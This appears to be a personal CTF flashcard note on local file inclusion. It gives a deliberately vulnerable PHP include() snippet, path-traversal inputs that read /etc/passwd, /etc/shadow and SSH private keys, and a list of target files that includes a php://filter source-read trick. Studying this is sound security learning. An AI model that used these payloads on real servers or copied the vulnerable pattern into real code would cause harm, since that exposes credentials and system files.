---
aliases:
  - Local file inclusion
tags:
  - flashcard/active/ctf
---

# Local file inclusion

Local file inclusion opens up {{access to server's local files}}because of vulnerabilities  
- Example vulnerable PHP code
```php
include($_GET['page'] . ".php");
```
1. User input ($_GET['page']) is used directly without {{validation}}
2. The include() function will try to read and include {{ANY file the web server has access to}}
3. No restrictions on:
- {{File path}} (../ can be used to traverse directories)
- {{File type (can include any file}}, not just PHP)
Corresponding attack to the above vulnerability
```php
http://vulnerable.com/index.php?page=../../../etc/passwd

# Original intended use:
page=header.php

# Malicious uses:
page=../../../etc/passwd    # Read system users
page=../../../etc/shadow    # Read password hashes
page=../../.ssh/id_rsa      # Read SSH keys
```
<!--SR:!2024-12-15,1,230!2024-12-18,4,270!2024-12-15,1,230!2024-12-18,4,270!2024-12-18,4,270-->

# Common files to target

```
/etc/passwd     # User information
/etc/hosts      # Network configuration
/proc/self/environ  # Environment variables
/var/log/apache2/access.log  # Web server logs
php://filter/convert.base64-encode/resource=index.php  # Read PHP source code
```
